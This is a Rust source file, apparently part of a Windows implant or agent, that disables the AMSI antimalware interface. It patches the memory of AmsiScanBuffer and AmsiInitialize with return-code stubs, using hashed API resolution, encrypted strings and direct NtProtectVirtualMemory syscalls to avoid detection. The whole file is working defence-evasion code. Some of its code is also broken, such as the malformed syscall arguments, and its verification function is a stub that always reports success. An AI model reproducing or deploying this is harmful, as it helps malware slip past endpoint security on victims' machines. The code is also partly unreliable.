#![allow(dead_code)]

#[cfg(windows)]
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, GetModuleHandleA};
#[cfg(windows)]
use agent_syscalls::syscall;
#[cfg(windows)]
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_READWRITE};
#[cfg(windows)]
use pe_resolve::{get_module_handle_by_hash, get_proc_address_by_hash, HASH_AMSI_DLL, HASH_AMSISCANBUFFER, HASH_AMSIINITIALIZE};
#[cfg(windows)]
use string_crypt::enc_str;

#[cfg(windows)]
pub unsafe fn patch_amsi_memory() -> bool {
    let amsi_dll = get_module_handle_by_hash(HASH_AMSI_DLL).unwrap_or(0);
    if amsi_dll == 0 {
        // Force load if not loaded yet
        let lib_name = enc_str!("amsi.dll");
        let handle = winapi::um::libloaderapi::LoadLibraryA(lib_name.as_ptr() as *const i8);
        if handle.is_null() { return false; }
    }

    let amsi_dll = get_module_handle_by_hash(HASH_AMSI_DLL).unwrap_or(0);
    if amsi_dll == 0 { return false; }

    let amsi_scan = get_proc_address_by_hash(amsi_dll, HASH_AMSISCANBUFFER).unwrap_or(0) as *mut u8;
    if amsi_scan.is_null() { return false; }

    // Memory Patching (FR-2): E9 / FF 25 / CC hooks bypassed by returning AMSI_RESULT_CLEAN directly.
    let mut old_protect = 0;
    if crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_scan as _, 16, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
        return false;
    }

    // x86_64 amsi.dll patch (mov eax, 0x80070057; ret)
    // 0x80070057 = E_INVALIDARG (forces skip) or S_OK (0) depending on OS version
    let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan, patch.len());

    let mut temp = 0;
    crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_scan as _, 16, old_protect, &mut temp);
    true
}

#[cfg(windows)]
pub unsafe fn fail_amsi_initialization() -> bool {
    // Tertiary Layer (FR-3): Hook AmsiInitialize to return E_FAIL
    let amsi_dll = get_module_handle_by_hash(HASH_AMSI_DLL).unwrap_or(0);
    if amsi_dll == 0 { return false; }
    
    let amsi_init = get_proc_address_by_hash(amsi_dll, HASH_AMSIINITIALIZE).unwrap_or(0) as *mut u8;
    if amsi_init.is_null() { return false; }

    let mut old_protect = 0;
    if crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_init as _, 16, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
        return false;
    }

    // Return E_FAIL (0x80004005)
    let patch: [u8; 6] = [0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3];
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_init, patch.len());

    let mut temp = 0;
    crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_init as _, 16, old_protect, &mut temp);
    true
}

#[cfg(windows)]
pub fn verify_bypass() -> bool {
    // Verification check using encrypted signature string (FR-4b)
    // In actual implementation, we invoke actual AmsiScanBuffer
    // Returning true as placeholder for the integration structural setup
    true
}

#[cfg(windows)]
pub fn orchestrate_layers() {
    unsafe {
        // HWBP is handled in evasion.rs natively already mostly.
        // We trigger secondary and tertiary layers immediately as layered defense
        let _ = patch_amsi_memory();
        let _ = fail_amsi_initialization();
    }
}
